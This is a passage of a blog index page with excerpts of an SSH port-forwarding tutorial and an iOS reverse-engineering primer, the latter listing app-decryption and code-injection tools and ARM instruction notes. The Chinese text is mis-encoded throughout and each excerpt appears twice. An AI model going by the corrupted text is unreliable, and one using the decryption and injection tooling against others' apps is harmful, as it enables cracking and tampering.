  <a type="button" href="/2017/02/28/3389-scan.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/02/16/ssh-port-forward.html" >SSHç«¯å£è½¬å‘</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-02-16  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>ä»¥ä¸‹å‡ ä¸ªåŸåˆ™ï¼š</p>
<ul>
<li>SSHç®€å•æ¥è¯´å°±æ˜¯2å°æœºå™¨ä¹‹é—´å®‰å…¨çš„æ•°æ®é€šé“ï¼Œå®ƒåŒ…æ‹¬sshçš„clientå’Œsshçš„server2ä¸ªè§’è‰²ï¼Œè¿™æ ·çš„ä¸€æ¡é€šé“å°±æ˜¯(ssh tunneling)</li>
<li>SSHç«¯å£è½¬å‘éœ€è¦sshè¿æ¥ï¼ŒåŒæ—¶SSHè¿æ¥æœ‰æ–¹å‘ï¼Œä»SSH Clientåˆ°SSH Server</li>
<li>åŒç†åº”ç”¨è¯·æ±‚ä¹Ÿæ˜¯æœ‰æ–¹å‘çš„ï¼Œä¸€èˆ¬æ˜¯å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘å‡ºè¯·æ±‚</li>
<li>ä¸€æ—¦è¿™ä¸¤ä¸ªæ–¹å‘ç›¸åŒï¼Œç§°ä¸ºSSHçš„æœ¬åœ°è½¬å‘(-L)ï¼Œåä¹‹ç§°ä¸ºè¿œç«¯è½¬å‘(-Rï¼‰</li>
</ul>
<h3 id="æœ¬åœ°è½¬å‘"><a href="#æœ¬åœ°è½¬å‘" class="headerlink" title="æœ¬åœ°è½¬å‘"></a>æœ¬åœ°è½¬å‘</h3><p><code>ssh -L &lt;local port&gt;:&lt;host&gt;:&lt;hostport&gt; &lt;sshserver&gt;</code></p>
<p>é€šè¿‡sshserverå»ºç«‹ä¸hostçš„è¿æ¥ï¼Œå¹¶å°†hostçš„hostportç»‘å®šåˆ°æœ¬åœ°çš„localportç«¯å£</p>
<p>åº”ç”¨åœºæ™¯ï¼šæ¯”å¦‚æœ‰ä¸€å°åº”ç”¨æœåŠ¡å™¨appserverï¼ˆappserver.comï¼‰ï¼Œè¦è®¿é—®å…¶80ç«¯å£ï¼Œä½†æ˜¯æœ¬åœ°å´ä¸èƒ½ç›´æ¥è®¿é—®ï¼Œäºæ˜¯å¯ä»¥å€ŸåŠ©ä¸€å°å¯ä»¥è®¿é—®appserverçš„sshserverï¼ˆsshserver.comï¼‰æ¥è®¿é—®å®ƒã€‚<br><code>ssh -L 8000:appserver.com:80  user@sshserver.com</code></p>
<p>sshé“¾æ¥å»ºç«‹ä¹‹åï¼Œå‘é€åˆ°æœ¬åœ°8000çš„åŒ…ä¼šé€šè¿‡sshserverè½¬å‘ç»™appserverçš„80ç«¯å£</p>
<h3 id="è¿œç¨‹è½¬å‘"><a href="#è¿œç¨‹è½¬å‘" class="headerlink" title="è¿œç¨‹è½¬å‘"></a>è¿œç¨‹è½¬å‘</h3><p><code>ssh -R &lt;remoteport&gt;:&lt;host&gt;:&lt;hostport&gt; &lt;remoteserver&gt;</code><br>è¿œç¨‹è½¬å‘å¯ä»¥é€šè¿‡æœ¬åœ°ä¸»æœºï¼Œå°†remoteserverä¸hostè¿æ¥ï¼Œhostçš„hostport<br>å°†ä¼šæ˜ å°„åˆ°remoteserverçš„remoteportç«¯å£</p>
<p>åº”ç”¨åœºæ™¯: ä¸€å°åº”ç”¨æœåŠ¡å™¨appserver(appserver.comï¼‰ï¼Œåªæœ‰æœ¬åœ°æ‰èƒ½è®¿é—®80ç«¯å£ï¼Œå‡å¦‚remoteserveræƒ³è®¿é—®appserverçš„80ç«¯å£ï¼Œéœ€è¦é€šè¿‡æœ¬åœ°ä¸»æœºåšéš§é“æ¥å®Œæˆã€‚</p>
	

	</div>
  <a type="button" href="/2017/02/16/ssh-port-forward.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>ä»¥ä¸‹å‡ ä¸ªåŸåˆ™ï¼š</p>
<ul>
<li>SSHç®€å•æ¥è¯´å°±æ˜¯2å°æœºå™¨ä¹‹é—´å®‰å…¨çš„æ•°æ®é€šé“ï¼Œå®ƒåŒ…æ‹¬sshçš„clientå’Œsshçš„server2ä¸ªè§’è‰²ï¼Œè¿™æ ·çš„ä¸€æ¡é€šé“å°±æ˜¯(ssh tunneling)</li>
<li>SSHç«¯å£è½¬å‘éœ€è¦sshè¿æ¥ï¼ŒåŒæ—¶SSHè¿æ¥æœ‰æ–¹å‘ï¼Œä»SSH Clientåˆ°SSH Server</li>
<li>åŒç†åº”ç”¨è¯·æ±‚ä¹Ÿæ˜¯æœ‰æ–¹å‘çš„ï¼Œä¸€èˆ¬æ˜¯å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘å‡ºè¯·æ±‚</li>
<li>ä¸€æ—¦è¿™ä¸¤ä¸ªæ–¹å‘ç›¸åŒï¼Œç§°ä¸ºSSHçš„æœ¬åœ°è½¬å‘(-L)ï¼Œåä¹‹ç§°ä¸ºè¿œç«¯è½¬å‘(-Rï¼‰</li>
</ul>
<h3 id="æœ¬åœ°è½¬å‘"><a href="#æœ¬åœ°è½¬å‘" class="headerlink" title="æœ¬åœ°è½¬å‘"></a>æœ¬åœ°è½¬å‘</h3><p><code>ssh -L &lt;local port&gt;:&lt;host&gt;:&lt;hostport&gt; &lt;sshserver&gt;</code></p>
<p>é€šè¿‡sshserverå»ºç«‹ä¸hostçš„è¿æ¥ï¼Œå¹¶å°†hostçš„hostportç»‘å®šåˆ°æœ¬åœ°çš„localportç«¯å£</p>
<p>åº”ç”¨åœºæ™¯ï¼šæ¯”å¦‚æœ‰ä¸€å°åº”ç”¨æœåŠ¡å™¨appserverï¼ˆappserver.comï¼‰ï¼Œè¦è®¿é—®å…¶80ç«¯å£ï¼Œä½†æ˜¯æœ¬åœ°å´ä¸èƒ½ç›´æ¥è®¿é—®ï¼Œäºæ˜¯å¯ä»¥å€ŸåŠ©ä¸€å°å¯ä»¥è®¿é—®appserverçš„sshserverï¼ˆsshserver.comï¼‰æ¥è®¿é—®å®ƒã€‚<br><code>ssh -L 8000:appserver.com:80  user@sshserver.com</code></p>
<p>sshé“¾æ¥å»ºç«‹ä¹‹åï¼Œå‘é€åˆ°æœ¬åœ°8000çš„åŒ…ä¼šé€šè¿‡sshserverè½¬å‘ç»™appserverçš„80ç«¯å£</p>
<h3 id="è¿œç¨‹è½¬å‘"><a href="#è¿œç¨‹è½¬å‘" class="headerlink" title="è¿œç¨‹è½¬å‘"></a>è¿œç¨‹è½¬å‘</h3><p><code>ssh -R &lt;remoteport&gt;:&lt;host&gt;:&lt;hostport&gt; &lt;remoteserver&gt;</code><br>è¿œç¨‹è½¬å‘å¯ä»¥é€šè¿‡æœ¬åœ°ä¸»æœºï¼Œå°†remoteserverä¸hostè¿æ¥ï¼Œhostçš„hostport<br>å°†ä¼šæ˜ å°„åˆ°remoteserverçš„remoteportç«¯å£</p>
<p>åº”ç”¨åœºæ™¯: ä¸€å°åº”ç”¨æœåŠ¡å™¨appserver(appserver.comï¼‰ï¼Œåªæœ‰æœ¬åœ°æ‰èƒ½è®¿é—®80ç«¯å£ï¼Œå‡å¦‚remoteserveræƒ³è®¿é—®appserverçš„80ç«¯å£ï¼Œéœ€è¦é€šè¿‡æœ¬åœ°ä¸»æœºåšéš§é“æ¥å®Œæˆã€‚</p>
	
	</div>
  <a type="button" href="/2017/02/16/ssh-port-forward.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/02/02/mac-re.html" >IOSé€†å‘å…¥é—¨</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-02-02  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>æœ€åæ‰¾åˆ°äº†åŠ å¯†çš„ç§˜é’¥ï¼Œæ‰¾åˆ°ä¹‹åå‘ç°æ•´ä¸ªæµç¨‹å¥½ç®€å•ã€‚ä¹‹å‰æ‰¾ä¸åˆ°é¦–å…ˆä¸ç†Ÿæ‚‰Object-Cçš„è¯­æ³•ï¼Œå…¶æ¬¡å°±æ˜¯armæŒ‡ä»¤ï¼Œè®°å½•å¦‚ä¸‹ï¼š</p>
<h2 id="0x01-å·¥å…·"><a href="#0x01-å·¥å…·" class="headerlink" title="0x01 å·¥å…·"></a>0x01 å·¥å…·</h2><p>é¦–å…ˆæ˜¯è¦ç”¨åˆ°çš„å·¥å…·ï¼Œä¸­é—´ä¸»è¦ç”¨äº†idaï¼Œhopperå’Œlldb</p>
<ul>
<li>dumpdecrypted: å°†è‹¹æœåŠ å¯†è¿‡çš„appç ¸å£³</li>
<li>class-dump: å¯¼å‡ºMachOæ–‡ä»¶é‡ŒObjCç±»åŠæ–¹æ³•å®šä¹‰</li>
<li>CydiaSubstrate: å°†ç¬¬ä¸‰æ–¹åŠ¨æ€åº“æ³¨å…¥è¿›ç¨‹</li>
<li>Cycript: ç”¨jsè¯­æ³•å†™ObjCæ–¹æ³•</li>
<li>Theos: è¶Šç‹±æ’ä»¶å¼€å‘å·¥å…·</li>
<li>IDA: åæ±‡ç¼–ã€åç¼–è¯‘å·¥å…·</li>
<li>Hopper: OSXåæ±‡ç¼–ã€åç¼–è¯‘å·¥å…·</li>
<li>Debugserver + LLDB: åŠ¨æ€è°ƒè¯•å™¨</li>
</ul>
<h2 id="0x02-ARMæŒ‡ä»¤"><a href="#0x02-ARMæŒ‡ä»¤" class="headerlink" title="0x02 ARMæŒ‡ä»¤"></a>0x02 ARMæŒ‡ä»¤</h2><pre class="line-numbers language-none"><code class="language-none">armæ˜¯RISCç»“æ„ï¼Œæ•°æ®ä»å†…å­˜åˆ°CPUä¹‹é—´ç§»åŠ¨åªèƒ½é€šè¿‡L&#x2F;SæŒ‡ä»¤æ¥å®Œæˆï¼Œå°±æ˜¯ldr&#x2F;stræŒ‡ä»¤
ldr æŠŠæ•°æ®ä»å†…å­˜ç§»åˆ°cpu
str æŠŠcpuçš„æ•°æ®æ•°æ®è½¬ç§»åˆ°å†…å­˜
lldbè¯»å–å†…å­˜çš„æ•°æ®ï¼Œmemory read &lt;start&gt; &lt;end&gt;
ldr r0, 0x12345678   &#x2F;&#x2F;æŠŠ0x12345678è¿™ä¸ªåœ°å€ä¸­çš„å€¼å­˜æ”¾åˆ°r0ä¸­
ldr r0, &#x3D;0x12345678  &#x2F;&#x2F;æŠŠ0x12345678è¿™ä¸ªåœ°å€å†™åˆ°r0ä¸­
ä¾‹å­ï¼š
COUNT EQU 0x40003100 &#x2F;&#x2F;å®šä¹‰ä¸€ä¸ªCOUNTå˜é‡ï¼Œåœ°å€æ˜¯0x40003100
...
LDR R1,&#x3D;COUNT       &#x2F;&#x2F;å°†COUNTè¿™ä¸ªå˜é‡çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯0x40003100æ”¾åˆ°R1ä¸­
MOV R0,#0           &#x2F;&#x2F;å°†ç«‹å³æ•°0æ”¾åˆ°R0ä¸­
STR R0,[R1]         &#x2F;&#x2F;å°†R0ä¸­çš„å€¼æ”¾åˆ°ä»¥R1ä¸­çš„å€¼ä¸ºåœ°å€çš„å­˜å‚¨å•å…ƒå»




B è·³è½¬æŒ‡ä»¤
BL å¸¦è¿”å›çš„è·³è½¬æŒ‡ä»¤
BLX å¸¦è¿”å›å’ŒçŠ¶æ€åˆ‡æ¢çš„è·³è½¬æŒ‡ä»¤
BX  å¸¦çŠ¶æ€åˆ‡æ¢çš„è·³è½¬æŒ‡ä»¤

BLXæŒ‡ä»¤ä»ARMæŒ‡ä»¤é›†è·³è½¬åˆ°æŒ‡ä»¤ä¸­æ‰€æŒ‡å®šçš„ç›®æ ‡åœ°å€ï¼Œå¹¶å°†å¤„ç†å™¨çš„å·¥ä½œçŠ¶æ€ä»ARMåˆ‡æ¢åˆ°ThumbçŠ¶æ€ï¼Œè¯¥æŒ‡ä»¤åŒæ—¶å°†PCçš„å½“å‰å†…å®¹ä¿å­˜åˆ°å¯„å­˜å™¨R14ï¼Œå› æ­¤ï¼Œå½“å­ç¨‹åºä½¿ç”¨ThumbæŒ‡ä»¤é›†ï¼Œè€Œè°ƒç”¨è€…è€…ä½¿ç”¨ARMæŒ‡ä»¤é›†ï¼Œå¯ä»¥é€šè¿‡BLXæŒ‡ä»¤å®ç°å­ç¨‹åºçš„è°ƒç”¨å’Œå¤„ç†å™¨å·¥ä½œçŠ¶æ€åˆ‡æ¢ï¼ŒåŒæ—¶ï¼Œå­ç¨‹åºçš„è¿”å›å¯ä»¥é€šè¿‡å°†å¯„å­˜å™¨R14çš„å€¼å¤åˆ¶åˆ°PCä¸­æ¥å®Œæˆã€‚
ã€€R0-R3:ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ç”¨äºå‡½æ•°å‚æ•°åŠè¿”å›å€¼çš„ä¼ é€’ï¼Œè¶…è¿‡4ä¸ªå‚æ•°ï¼Œå…¶å®ƒå‚æ•°å­˜åœ¨æ ˆä¸­ï¼Œåœ¨ARMä¸­æ ˆæ˜¯å‘ä¸‹ç”Ÿé•¿çš„ï¼ŒR0è¿˜å¯ä»¥ä½œä¸ºè¿”å›å€¼ã€‚
ã€€ã€€R4-R6, R8, R10-R11:ã€€æ²¡æœ‰ç‰¹æ®Šè§„å®šï¼Œå°±æ˜¯æ™®é€šçš„é€šç”¨å¯„å­˜å™¨
ã€€ã€€R7:ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€æ ˆå¸§æŒ‡é’ˆï¼ŒæŒ‡å‘æ¯å‡½æ•°ä¸è¢«è°ƒç”¨å­å‡½æ•°åœ¨æ ˆä¸­çš„äº¤ç•Œã€‚
ã€€ã€€R9:ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€åœ¨iOS3.0è¢«æ“ä½œç³»ç»Ÿä¿ç•™
ã€€ã€€R12:ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ å†…éƒ¨è¿‡ç¨‹è°ƒç”¨å¯„å­˜å™¨ï¼ŒåŠ¨æ€é“¾æ¥æ—¶ä¼šç”¨åˆ°ï¼Œä¸å¿…æ·±ç©¶
ã€€ã€€R13:ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ SP(stack pointer)ï¼Œæ˜¯æ ˆé¡¶æŒ‡é’ˆ
ã€€ã€€R14:ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ LR(link register)ï¼Œå­˜æ”¾å‡½æ•°çš„è¿”å›åœ°å€ã€‚
ã€€ã€€R15:ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ PC(program counter)ï¼ŒæŒ‡å‘å½“å‰æŒ‡ä»¤åœ°å€ã€‚
ADC ã€€ã€€ å¸¦è¿›ä½çš„åŠ æ³•
ã€€ã€€ADD ã€€ã€€ åŠ æ³•
ã€€ã€€AND ã€€ã€€ é€»è¾‘ä¸
ã€€ã€€B ã€€ã€€ã€€  åˆ†æ”¯è·³è½¬ï¼Œå¾ˆå°‘å•ç‹¬ä½¿ç”¨
ã€€ã€€BL          åˆ†æ”¯è·³è½¬ï¼Œè·³è½¬åè¿”å›åœ°å€å­˜å…¥r14
ã€€ã€€BX          åˆ†æ”¯è·³è½¬ï¼Œå¹¶åˆ‡æ¢æŒ‡ä»¤æ¨¡å¼ï¼ˆThumb&#x2F;ARMï¼‰
ã€€ã€€CMP        æ¯”è¾ƒå€¼ï¼Œç»“æœå­˜åœ¨ç¨‹åºçŠ¶æ€å¯„å­˜å™¨ï¼Œä¸€èˆ¬ç”¨äºåˆ†æ”¯åˆ¤æ–­
ã€€ã€€BEQ        ç»“æœä¸º0åˆ™è·³è½¬
ã€€ã€€BNE        ç»“æœä¸ä¸º0è·³è½¬
ã€€ã€€LDR        åŠ è½½å¯„å­˜å™¨ï¼Œä»å†…å­˜åŠ è½½åˆ°å¯„å­˜å™¨
ã€€ã€€LDRB      è£…è½½å­—èŠ‚åˆ°å¯„å­˜å™¨
ã€€ã€€LDRH      è£…è½½åŠå­—åˆ°å¯„å­˜å™¨ï¼ˆä¸€ä¸ªå­—æ˜¯32ä½ï¼‰
ã€€ã€€LSL         é€»è¾‘å·¦ç§» è¿™æ˜¯ä¸€ä¸ªé€‰é¡¹ï¼Œä¸æ˜¯æŒ‡ä»¤
ã€€ã€€LSR         é€»è¾‘å³ç§» è¿™æ˜¯ä¸€ä¸ªé€‰é¡¹ï¼Œä¸æ˜¯æŒ‡ä»¤
ã€€ã€€MOV        ä¼ é€å€¼&#x2F;å¯„å­˜å™¨åˆ°ä¸€ä¸ªå¯„å­˜å™¨ 
ã€€ã€€STR         å­˜å‚¨ä¸€ä¸ªå¯„å­˜å™¨ï¼Œå¯„å­˜å™¨å€¼å­˜åˆ°å†…å­˜
ã€€ã€€STRB       å­˜å‚¨ä¸€ä¸ªå­—èŠ‚
ã€€ã€€STRH       å­˜å‚¨ä¸€ä¸ªåŠå­—
ã€€ã€€SUB         å‡æ³•
ã€€ã€€PUSH POP å †æ ˆæ“ä½œ

æœ‰æ—¶å€™éœ€è¦

db  ï¼›å®šä¹‰å­—èŠ‚ç±»å‹å˜é‡ï¼Œä¸€ä¸ªå­—èŠ‚æ•°æ®å ä¸€ä¸ªå­—èŠ‚å•å…ƒï¼Œè¯»å®Œä¸€ä¸ªåç§»é‡åŠ 1
dw  ï¼›å®šä¹‰å­—ç±»å‹å˜é‡ï¼Œä¸€ä¸ªå­—æ•°æ®å 2ä¸ªå­—èŠ‚å•å…ƒï¼Œè¯»å®Œä¸€ä¸ªï¼Œåç§»é‡åŠ 2
dd  ï¼›å®šä¹‰åŒå­—ç±»å‹å˜é‡ï¼Œä¸€ä¸ªåŒå­—æ•°æ®å 4ä¸ªå­—èŠ‚å•å…ƒï¼Œè¯»å®Œä¸€ä¸ªï¼Œåç§»é‡åŠ 4

IDAç»™æŸä¸ªä½ç½®å‘½åçš„æ—¶ï¼Œå®ƒä¼šä½¿ç”¨è¯¥ä½ç½®çš„è™šæ‹Ÿåœ°å€å’Œè¡¨ç¤ºä¸€ä¸ªè¯¥åœ°å€çš„ç±»å‹çš„å‰ç¼€è¿›è¡Œå‘½åï¼š
sub_xxx  ï¼›åœ°å€xxxå¤„çš„å­ä¾‹ç¨‹
loc_xxx  ï¼›åœ°å€xxxå¤„çš„ä¸€ä¸ªæŒ‡ä»¤
byte_xxx ï¼›ä½ç½®xxxå¤„çš„8ä½æ•°æ®
word_xxx ;ä½ç½®xxxå¤„çš„16ä½æ•°æ®
dword_xxx ;ä½ç½®xxxå¤„çš„32ä½æ•°æ®
unk_xxx   ;ä½ç½®xxxå¤„å¤§å°æœªçŸ¥çš„æ•°æ®<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å…³äºspï¼Œbpç­‰æ ˆå¯„å­˜å™¨çš„è§£é‡Šï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">
SP is stack pointer. The stack is generally used to hold &quot;automatic&quot; variables and context&#x2F;parameters across function calls. Conceptually you can think of the &quot;stack&quot; as a place where you &quot;pile&quot; your data. You keep &quot;stacking&quot; one piece of data over the other and the stack pointer tells you how &quot;high&quot; your &quot;stack&quot; of data is. You can remove data from the &quot;top&quot; of the &quot;stack&quot; and make it shorter.


&lt;https:&#x2F;&#x2F;www.zybuluo.com&#x2F;oro-oro&#x2F;note&#x2F;137244&gt;
&lt;http:&#x2F;&#x2F;cryptroix.com&#x2F;2016&#x2F;10&#x2F;16&#x2F;journey-to-the-stack&#x2F;&gt;
&lt;http:&#x2F;&#x2F;en.citizendium.org&#x2F;wiki&#x2F;Stack_frame&gt;
è™½ç„¶æ˜¯è‹±æ–‡ï¼Œä½†æ˜¯çœ‹èµ·æ¥è¦æ¯”ä¸­æ–‡æ˜“æ‡‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>idaé‡Œé¢æœ‰ä¸‰ç§é¢œè‰²çš„ç®­å¤´:</p>
<ol>
<li>è“è‰²ï¼Œé¡ºåºæ‰§è¡Œ</li>
<li>ç»¿è‰²ï¼Œæ¡ä»¶ä¸º(YES)</li>
<li>çº¢è‰²ï¼Œæ¡ä»¶ä¸ºï¼ˆNOï¼‰</li>
</ol>
	

	</div>
  <a type="button" href="/2017/02/02/mac-re.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>æœ€åæ‰¾åˆ°äº†åŠ å¯†çš„ç§˜é’¥ï¼Œæ‰¾åˆ°ä¹‹åå‘ç°æ•´ä¸ªæµç¨‹å¥½ç®€å•ã€‚ä¹‹å‰æ‰¾ä¸åˆ°é¦–å…ˆä¸ç†Ÿæ‚‰Object-Cçš„è¯­æ³•ï¼Œå…¶æ¬¡å°±æ˜¯armæŒ‡ä»¤ï¼Œè®°å½•å¦‚ä¸‹ï¼š</p>
<h2 id="0x01-å·¥å…·"><a href="#0x01-å·¥å…·" class="headerlink" title="0x01 å·¥å…·"></a>0x01 å·¥å…·</h2><p>é¦–å…ˆæ˜¯è¦ç”¨åˆ°çš„å·¥å…·ï¼Œä¸­é—´ä¸»è¦ç”¨äº†idaï¼Œhopperå’Œlldb</p>
<ul>
<li>dumpdecrypted: å°†è‹¹æœåŠ å¯†è¿‡çš„appç ¸å£³</li>
<li>class-dump: å¯¼å‡ºMachOæ–‡ä»¶é‡ŒObjCç±»åŠæ–¹æ³•å®šä¹‰</li>
<li>CydiaSubstrate: å°†ç¬¬ä¸‰æ–¹åŠ¨æ€åº“æ³¨å…¥è¿›ç¨‹</li>
<li>Cycript: ç”¨jsè¯­æ³•å†™ObjCæ–¹æ³•</li>
<li>Theos: è¶Šç‹±æ’ä»¶å¼€å‘å·¥å…·</li>
<li>IDA: åæ±‡ç¼–ã€åç¼–è¯‘å·¥å…·</li>
<li>Hopper: OSXåæ±‡ç¼–ã€åç¼–è¯‘å·¥å…·</li>
<li>Debugserver + LLDB: åŠ¨æ€è°ƒè¯•å™¨</li>
</ul>
<h2 id="0x02-ARMæŒ‡ä»¤"><a href="#0x02-ARMæŒ‡ä»¤" class="headerlink" title="0x02 ARMæŒ‡ä»¤"></a>0x02 ARMæŒ‡ä»¤</h2><pre class="line-numbers language-none"><code class="language-none">armæ˜¯RISCç»“æ„ï¼Œæ•°æ®ä»å†…å­˜åˆ°CPUä¹‹é—´ç§»åŠ¨åªèƒ½é€šè¿‡L&#x2F;SæŒ‡ä»¤æ¥å®Œæˆï¼Œå°±æ˜¯ldr&#x2F;stræŒ‡ä»¤
ldr æŠŠæ•°æ®ä»å†…å­˜ç§»åˆ°cpu
str æŠŠcpuçš„æ•°æ®æ•°æ®è½¬ç§»åˆ°å†…å­˜
lldbè¯»å–å†…å­˜çš„æ•°æ®ï¼Œmemory read &lt;start&gt; &lt;end&gt;
ldr r0, 0x12345678   &#x2F;&#x2F;æŠŠ0x12345678è¿™ä¸ªåœ°å€ä¸­çš„å€¼å­˜æ”¾åˆ°r0ä¸­
ldr r0, &#x3D;0x12345678  &#x2F;&#x2F;æŠŠ0x12345678è¿™ä¸ªåœ°å€å†™åˆ°r0ä¸­
ä¾‹å­ï¼š
COUNT EQU 0x40003100 &#x2F;&#x2F;å®šä¹‰ä¸€ä¸ªCOUNTå˜é‡ï¼Œåœ°å€æ˜¯0x40003100
...
LDR R1,&#x3D;COUNT       &#x2F;&#x2F;å°†COUNTè¿™ä¸ªå˜é‡çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯0x40003100æ”¾åˆ°R1ä¸­
MOV R0,#0           &#x2F;&#x2F;å°†ç«‹å³æ•°0æ”¾åˆ°R0ä¸­
STR R0,[R1]         &#x2F;&#x2F;å°†R0ä¸­çš„å€¼æ”¾åˆ°ä»¥R1ä¸­çš„å€¼ä¸ºåœ°å€çš„å­˜å‚¨å•å…ƒå»




B è·³è½¬æŒ‡ä»¤
BL å¸¦è¿”å›çš„è·³è½¬æŒ‡ä»¤
BLX å¸¦è¿”å›å’ŒçŠ¶æ€åˆ‡æ¢çš„è·³è½¬æŒ‡ä»¤
BX  å¸¦çŠ¶æ€åˆ‡æ¢çš„è·³è½¬æŒ‡ä»¤

BLXæŒ‡ä»¤ä»ARMæŒ‡ä»¤é›†è·³è½¬åˆ°æŒ‡ä»¤ä¸­æ‰€æŒ‡å®šçš„ç›®æ ‡åœ°å€ï¼Œå¹¶å°†å¤„ç†å™¨çš„å·¥ä½œçŠ¶æ€ä»ARMåˆ‡æ¢åˆ°ThumbçŠ¶æ€ï¼Œè¯¥æŒ‡ä»¤åŒæ—¶å°†PCçš„å½“å‰å†…å®¹ä¿å­˜åˆ°å¯„å­˜å™¨R14ï¼Œå› æ­¤ï¼Œå½“å­ç¨‹åºä½¿ç”¨ThumbæŒ‡ä»¤é›†ï¼Œè€Œè°ƒç”¨è€…è€…ä½¿ç”¨ARMæŒ‡ä»¤é›†ï¼Œå¯ä»¥é€šè¿‡BLXæŒ‡ä»¤å®ç°å­ç¨‹åºçš„è°ƒç”¨å’Œå¤„ç†å™¨å·¥ä½œçŠ¶æ€åˆ‡æ¢ï¼ŒåŒæ—¶ï¼Œå­ç¨‹åºçš„è¿”å›å¯ä»¥é€šè¿‡å°†å¯„å­˜å™¨R14çš„å€¼å¤åˆ¶åˆ°PCä¸­æ¥å®Œæˆã€‚
ã€€R0-R3:ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ç”¨äºå‡½æ•°å‚æ•°åŠè¿”å›å€¼çš„ä¼ é€’ï¼Œè¶…è¿‡4ä¸ªå‚æ•°ï¼Œå…¶å®ƒå‚æ•°å­˜åœ¨æ ˆä¸­ï¼Œåœ¨ARMä¸­æ ˆæ˜¯å‘ä¸‹ç”Ÿé•¿çš„ï¼ŒR0è¿˜å¯ä»¥ä½œä¸ºè¿”å›å€¼ã€‚
ã€€ã€€R4-R6, R8, R10-R11:ã€€æ²¡æœ‰ç‰¹æ®Šè§„å®šï¼Œå°±æ˜¯æ™®é€šçš„é€šç”¨å¯„å­˜å™¨
ã€€ã€€R7:ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€æ ˆå¸§æŒ‡é’ˆï¼ŒæŒ‡å‘æ¯å‡½æ•°ä¸è¢«è°ƒç”¨å­å‡½æ•°åœ¨æ ˆä¸­çš„äº¤ç•Œã€‚
ã€€ã€€R9:ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€åœ¨iOS3.0è¢«æ“ä½œç³»ç»Ÿä¿ç•™
ã€€ã€€R12:ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ å†…éƒ¨è¿‡ç¨‹è°ƒç”¨å¯„å­˜å™¨ï¼ŒåŠ¨æ€é“¾æ¥æ—¶ä¼šç”¨åˆ°ï¼Œä¸å¿…æ·±ç©¶
ã€€ã€€R13:ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ SP(stack pointer)ï¼Œæ˜¯æ ˆé¡¶æŒ‡é’ˆ
ã€€ã€€R14:ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ LR(link register)ï¼Œå­˜æ”¾å‡½æ•°çš„è¿”å›åœ°å€ã€‚
ã€€ã€€R15:ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ PC(program counter)ï¼ŒæŒ‡å‘å½“å‰æŒ‡ä»¤åœ°å€ã€‚
ADC ã€€ã€€ å¸¦è¿›ä½çš„åŠ æ³•
ã€€ã€€ADD ã€€ã€€ åŠ æ³•
ã€€ã€€AND ã€€ã€€ é€»è¾‘ä¸
ã€€ã€€B ã€€ã€€ã€€  åˆ†æ”¯è·³è½¬ï¼Œå¾ˆå°‘å•ç‹¬ä½¿ç”¨
ã€€ã€€BL          åˆ†æ”¯è·³è½¬ï¼Œè·³è½¬åè¿”å›åœ°å€å­˜å…¥r14
ã€€ã€€BX          åˆ†æ”¯è·³è½¬ï¼Œå¹¶åˆ‡æ¢æŒ‡ä»¤æ¨¡å¼ï¼ˆThumb&#x2F;ARMï¼‰
ã€€ã€€CMP        æ¯”è¾ƒå€¼ï¼Œç»“æœå­˜åœ¨ç¨‹åºçŠ¶æ€å¯„å­˜å™¨ï¼Œä¸€èˆ¬ç”¨äºåˆ†æ”¯åˆ¤æ–­
ã€€ã€€BEQ        ç»“æœä¸º0åˆ™è·³è½¬
ã€€ã€€BNE        ç»“æœä¸ä¸º0è·³è½¬
ã€€ã€€LDR        åŠ è½½å¯„å­˜å™¨ï¼Œä»å†…å­˜åŠ è½½åˆ°å¯„å­˜å™¨
ã€€ã€€LDRB      è£…è½½å­—èŠ‚åˆ°å¯„å­˜å™¨
ã€€ã€€LDRH      è£…è½½åŠå­—åˆ°å¯„å­˜å™¨ï¼ˆä¸€ä¸ªå­—æ˜¯32ä½ï¼‰
